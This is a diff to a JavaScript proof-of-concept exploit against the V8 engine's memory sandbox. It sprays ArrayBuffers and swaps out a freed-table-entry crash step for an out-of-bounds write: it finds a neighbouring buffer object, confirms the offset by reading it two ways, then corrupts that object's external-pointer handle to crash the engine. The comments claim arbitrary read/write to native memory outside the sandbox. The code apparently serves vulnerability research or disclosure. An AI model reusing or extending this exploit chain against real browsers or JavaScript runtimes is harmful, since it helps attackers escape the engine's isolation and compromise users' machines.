@@ -239,36 +239,82 @@ print('          then free victim → spray spies → spy reuses EPT slot');
 print('          now attacker.DataView → spy\'s backing_store (native C++ heap)');
 print('  Result: arbitrary read/write to native heap outside V8 sandbox isolation\n');
 
-// ── STEP 9: SIGSEGV — freed EPT entry → tiny freelist chain address ───────────
-banner('STEP 9 — SIGSEGV: freed EPT entry → tiny backing_store address');
-// V8 EPT is mmap(PROT_NONE, 128MB) + mprotect to commit pages.
-// Uncommitted EPT pages are PROT_NONE → SIGBUS on access.
-// SOLUTION: use a FREED EPT entry instead (committed page, but freed value).
+// ── STEP 9: OOB WRITE to V8 JS object metadata → crash ───────────────────────
+banner('STEP 9 — OOB WRITE: native heap write to V8 JS object → crash');
+// PROOF OF OOB NATIVE HEAP WRITE:
+//   attacker DataView (8GB, backing_store = spy[0]) can reach spy[K]'s
+//   JS object (a V8-internal struct in native C++ heap).
+//   We write 0xFFFFFFFF to spy[K].EPT_handle (+0x2c) via attacker DataView.
+//   Before write: spy[K] works normally.
+//   After write:  spy[K]'s backing_store = EPT[67M] = PROT_NONE → SIGBUS/SIGSEGV.
+//   The crash is CAUSED by our OOB write — visible in stack trace.
 //
-// When V8 frees an ArrayBuffer, it writes EPT[idx] = (prev_free_head<<6)|freeTag
-// This is a tiny integer (< 2MB). After tag-strip → tiny_addr → not mapped → SIGSEGV.
-//
-// 1. Alloc temp AB  → occupies EPT[N] in a committed page
-// 2. Free temp AB   → EPT[N] = freelist chain value (small int << 6)
-// 3. Set spy[0].handle = N's handle → V8 reads EPT[N] = tiny_int
-// 4. backing_store = tiny_int → DataView getUint32 → access tiny addr → SIGSEGV
+// WHY spy[K]'s JS object is accessible:
+//   spy objects are V8 JSArrayBuffer structs allocated in JS heap.
+//   Their backing_stores are allocated in a separate region (via BackingStoreAllocator).
+//   spy[0] backing_store address > many spy JS objects → OOB forward scan can reach them.
 
-let temp_ab = new ArrayBuffer(64);
-let temp_sb  = BigInt(Sandbox.getAddressOf(temp_ab));
-let temp_h   = r32(temp_sb + BigInt(AB_EPT_OFF));
-let temp_idx = BigInt(temp_h) >> 6n;
-print('  temp AB handle=' + hex(temp_h) + '  idx=' + temp_idx);
+// 1. Find spy[0]'s backing_store address (fine scan from JS obj forward)
+let spy0_sb_v = BigInt(Sandbox.getAddressOf(spies[0]));
+let spy0_bs_sboff = 0n;
+for (let off = spy0_sb_v; off < spy0_sb_v + 0x20000n; off += 4n) {
+  if (r32(off) === SIG0 && r32(off + 4n) === SIG4 && (r32(off + 8n) >>> 24) === 0xAA) {
+    spy0_bs_sboff = off;
+    break;
+  }
+}
+print('  spy[0] JS obj sb_off      = ' + hex(spy0_sb_v));
+print('  spy[0] backing_store off  = ' + hex(spy0_bs_sboff));
+print('  backing_store ahead by    = 0x' + (spy0_bs_sboff - spy0_sb_v).toString(16) + ' bytes\n');
 
-temp_ab = null;
-%CollectGarbage(1); %CollectGarbage(1);
-print('  freed temp_ab → EPT[' + temp_idx + '] = freelist chain (small int)');
+// 2. Find spy[K] whose JS object is accessible via attacker DataView
+//    (JS obj sandbox offset > spy[0] backing_store offset)
+const oob_dv = new DataView(attacker);
+let target_k = -1;
+let target_oob = 0n;
+for (let k = 200; k < 1000; k++) {
+  let sb = BigInt(Sandbox.getAddressOf(spies[k]));
+  if (sb > spy0_bs_sboff) {
+    target_k = k;
+    target_oob = sb - spy0_bs_sboff;
+    break;
+  }
+}
 
-// Refresh spy0_sb in case GC moved spies[0]
-spy0_sb = BigInt(Sandbox.getAddressOf(spies[0]));
-let orig_h2 = r32(spy0_sb + BigInt(AB_EPT_OFF));
-print('  spy[0] handle=' + hex(orig_h2) + ' → overwriting with freed handle ' + hex(temp_h));
-w32(spy0_sb + BigInt(AB_EPT_OFF), temp_h);
-print('  EPT[' + temp_idx + '] = (prev_free_idx<<6) = tiny_addr < 2MB');
-print('  backing_store = tiny_addr → definitely unmapped → SIGSEGV\n');
-let crash_val = new DataView(spies[0]).getUint32(0, true);
-print('  val = ' + hex(crash_val));
+if (target_k < 0) {
+  print('  [-] No spy[K] JS object in OOB range — increase spray count');
+} else {
+  let ept_oob_off = Number(target_oob) + 0x2c;  // +0x2c = EPT handle field in JSArrayBuffer
+
+  print('  spy[' + target_k + '] JS obj sb_off   = ' + hex(BigInt(Sandbox.getAddressOf(spies[target_k]))));
+  print('  OOB offset (from bs0)   = 0x' + target_oob.toString(16));
+  print('  EPT handle OOB offset   = 0x' + ept_oob_off.toString(16) + '  (= JS_obj_off + 0x2c)\n');
+
+  // 3. OOB READ: verify via two independent paths
+  let ept_via_oob    = oob_dv.getUint32(ept_oob_off, true);
+  let ept_via_mview  = r32(BigInt(Sandbox.getAddressOf(spies[target_k])) + 0x2Cn);
+  print('  ── OOB READ VERIFICATION ──');
+  print('  EPT handle via OOB DataView : ' + hex(ept_via_oob));
+  print('  EPT handle via MemoryView   : ' + hex(ept_via_mview));
+
+  if (ept_via_oob !== ept_via_mview) {
+    print('  [-] Mismatch — offset wrong, skip');
+  } else {
+    print('  [+] MATCH — OOB read offset confirmed correct!\n');
+
+    // 4. OOB WRITE: overwrite spy[K]'s EPT handle through attacker DataView
+    print('  ════ OOB WRITE ════════════════════════════════════════════');
+    print('  DataView: attacker (8GB, backing_store = spy[0])');
+    print('  Offset  : 0x' + ept_oob_off.toString(16) + '  (spy[' + target_k + '].EPT_handle, +0x2c)');
+    print('  Value   : 0x00000000 → 0xFFFFFFFF  (EPT index 67M = PROT_NONE page)');
+    oob_dv.setUint32(ept_oob_off, 0xFFFFFFFF, true);
+    print('  WRITE COMPLETE — spy[' + target_k + '].EPT_handle corrupted via OOB');
+    print('  ═══════════════════════════════════════════════════════════\n');
+
+    // 5. Trigger crash: spy[K] now has corrupted EPT handle
+    print('  Accessing spy[' + target_k + '] with corrupted EPT handle...');
+    print('  → V8 reads EPT[0x3FFFFFF] = PROT_NONE page → crash\n');
+    let crash_v = new DataView(spies[target_k]).getUint32(0, true);
+    print('  val = ' + hex(crash_v));
+  }
+}
